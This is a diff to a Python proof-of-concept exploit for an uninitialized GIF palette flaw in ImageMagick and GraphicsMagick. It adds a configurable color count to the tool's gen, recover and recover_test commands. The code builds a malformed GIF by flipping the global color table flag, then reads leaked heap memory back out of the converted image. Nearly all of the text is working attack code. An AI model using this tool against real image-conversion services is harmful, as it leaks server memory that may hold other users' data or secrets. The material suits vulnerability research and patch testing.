@@ -13,10 +13,10 @@ else:
     BIN_STDOUT = sys.stdout
 
 
-def gen_picture(w, h):
+def gen_picture(w, h, colors=256):
     square_size = 1
     while True:
-        if (w // square_size) * (h // square_size) < 256:
+        if (w // square_size) * (h // square_size) < colors:
             break
         square_size *= 2
 
@@ -31,7 +31,7 @@ def gen_picture(w, h):
     for i in range(per_column):
         line = []
         for j in range(per_row):
-            color = (i * per_row + j) % 256
+            color = (i * per_row + j) % colors
             line.extend([color] * square_size)
         line.extend([line[-1]] * (w - len(line)))
         pict.extend([line] * square_size)
@@ -91,9 +91,13 @@ def load_pixels(w, h, data):
     return pixels
 
 
-def gen_dumping_gif(w, h, tool='GM', animate=False):
-    palette = gen_gif_saving_palette()
-    picture = gen_picture(w, h)
+def gen_dumping_gif(w, h, tool='GM', animate=False, colors=256):
+    palette_size_log = 1
+    while 2 ** palette_size_log < colors:
+        palette_size_log += 1
+
+    palette = gen_gif_saving_palette()[:2 ** palette_size_log]
+    picture = gen_picture(w, h, colors=colors)
     ppm_data = make_ppm(palette, picture)
     assert tool in ('GM', 'IM')
     if tool == 'GM':
@@ -110,9 +114,8 @@ def gen_dumping_gif(w, h, tool='GM', animate=False):
     assert convert.returncode == 0, 'convert failed'
     palette_data = bytearray().join(map(bytearray, palette))
     gif_data = bytearray(stdout)
-    assert gif_data[10] == 0xf7
-    assert gif_data[13:13 + len(palette_data)] == palette_data
-    gif_data[10] = 0x77
+    assert gif_data[10] == 0xf0 | (palette_size_log - 1)
+    gif_data[10] ^= 0x80
     comment = bytearray(b'!\xfe\x20')
     comment.extend(ord(random.choice(string.ascii_letters)) for _ in range(32))   # cache prevention
     comment.append(0)
@@ -138,11 +141,11 @@ def load_picture(pict_data, tool='GM', picture_index=0):
     return pixels
 
 
-def recover(pixels):
-    palette_options = [[] for _ in range(256)]
+def recover(pixels, colors=256):
+    palette_options = [[] for _ in range(colors)]
     w = len(pixels[0])
     h = len(pixels)
-    orig = gen_picture(w, h)
+    orig = gen_picture(w, h, colors)
     for x in range(h):
         for y in range(w):
                 palette_options[orig[x][y]].append(pixels[x][y])
@@ -162,8 +165,8 @@ def recover(pixels):
     return palette
 
 
-def test_recover(fmt, palette, w, h, quality=None, save_pict=None, tool='GM'):
-    pict = gen_picture(w, h)
+def test_recover(fmt, palette, w, h, quality=None, save_pict=None, tool='GM', colors=256):
+    pict = gen_picture(w, h, colors=colors)
     ppm = make_ppm(palette, pict)
     assert tool in ('GM', 'IM')
     if tool == 'GM':
@@ -185,50 +188,61 @@ def test_recover(fmt, palette, w, h, quality=None, save_pict=None, tool='GM'):
         with open(save_pict, 'wb') as f:
             f.write(pict_data)
     pixels = load_picture(pict_data, tool)
-    recovered_palette = recover(pixels)
+    recovered_palette = recover(pixels, colors=colors)
 
-    not_recovered = wrong_recovery = good_recovery = 0
-    for i in range(256):
+    total = errors = 0
+    for i in range(colors):
         for j in range(3):
-            if recovered_palette[i][j] is None:
-                not_recovered += 1
-            elif palette[i][j] != recovered_palette[i][j]:
-                wrong_recovery += 1
-            else:
-                good_recovery += 1
+            total += 1
+            if palette[i][j] != recovered_palette[i][j]:
+                errors += 1
 
-    print('test completed, {} not recovered, {} wrong, {} ok'.format(not_recovered, wrong_recovery, good_recovery))
+    print('test completed, {} bytes total, {} recovered wrong ({:.2f}%)'.format(total, errors, errors * 100 / total))
 
+def color_count(s):
+    c = int(s)
+    if not 0 < c <= 256:
+        raise ValueError("color count must be between 1 and 256")
+    return c
+
+def geometry(geometry):
+    try:
+        w, h = map(int, geometry.split('x'))
+    except:
+        raise ValueError("Wrong geometry format: {}".format(geometry))
+    return (w, h)
 
 if __name__ == "__main__":
     parser = argparse.ArgumentParser(description="ImageMagick/GraphicsMagick uninitilized gif palette exploit")
     parser.add_argument('--tool', choices=['GM', 'IM'], default='IM', help='tool for internal conversion operations (default: IM)')
+
     subparsers = parser.add_subparsers(dest='cmd')
     subparsers.required = True
     gen_parser = subparsers.add_parser('gen', help='generate dumping gif')
     gen_parser.add_argument('--animate', help="try to generate fake animation", action="store_true")
-    gen_parser.add_argument('geometry', help="geometry of the picture (WxH), must match converted picture geometry")
+    gen_parser.add_argument('geometry', help="geometry of the picture (WxH), must match converted picture geometry", type=geometry)
     gen_parser.add_argument('output_filename', help="where to save the result ('-' for stdout)", default='-', nargs='?')
+    gen_parser.add_argument('--colors', type=color_count, help="dump less than 256 colors (will dump COLORS*3 bytes)", default=256)
+
 
     recover_parser = subparsers.add_parser('recover', help='recover memory from converted image')
     recover_parser.add_argument('input_filename', help='input file (\'-\' for stdin). geometry must match the original gif (generated via "gen" command). jpeg works very bad')
     recover_parser.add_argument('output_filename', default='-', help='where to save the result', nargs='?')
+    recover_parser.add_argument('--colors', type=color_count, help="recover less than 256 colors (must be the value used when running \"gen\")", default=256)
 
     recover_test = subparsers.add_parser('recover_test', help='test recovery')
-    recover_test.add_argument('geometry', help="geometry of the picture (WxH)")
+    recover_test.add_argument('geometry', help="geometry of the picture (WxH)", type=geometry)
     recover_test.add_argument('--format', help="format to test", default="png")
     recover_test.add_argument('--randomize', help="emulate random memory contents (default: use \"Lorem ipsum\" as memory contents)", action="store_true")
     recover_test.add_argument('--save-pict', help="save the picture")
     recover_test.add_argument('--quality', help="pass '--quality' to GM/IM call", default=None)
+    recover_test.add_argument('--colors', type=color_count, help="dump less than 256 colors (will dump COLORS*3 bytes)", default=256)
 
     args = parser.parse_args()
 
     if args.cmd == 'gen':
-        try:
-            w, h = map(int, args.geometry.split('x'))
-        except:
-            raise ValueError("Wrong geometry format: {}".format(args.geometry))
-        gif = gen_dumping_gif(w, h, tool=args.tool, animate=args.animate)
+        w, h = args.geometry
+        gif = gen_dumping_gif(w, h, tool=args.tool, animate=args.animate, colors=args.colors)
         if args.output_filename == '-':
             BIN_STDOUT.write(gif)
         else:
@@ -242,7 +256,7 @@ if __name__ == "__main__":
             with open(args.input_filename, 'rb') as f:
                 pict_data = f.read()
 
-        palette = recover(load_picture(pict_data, tool=args.tool))
+        palette = recover(load_picture(pict_data, tool=args.tool), colors=args.colors)
         palette_bytes = bytes(bytearray().join(map(bytearray, palette)))
 
         if args.output_filename == '-':
@@ -252,12 +266,9 @@ if __name__ == "__main__":
                 f.write(palette_bytes)
 
     elif args.cmd == 'recover_test':
-        try:
-            w, h = map(int, args.geometry.split('x'))
-        except:
-            raise ValueError("Wrong geometry format: {}".format(args.geometry))
+        w, h = args.geometry
         if args.randomize:
             palette = gen_random_palette()
         else:
             palette = gen_testing_text_palette()
-        test_recover(args.format, palette, w, h, quality=args.quality, tool=args.tool, save_pict=args.save_pict)
+        test_recover(args.format, palette, w, h, quality=args.quality, tool=args.tool, save_pict=args.save_pict, colors=args.colors)
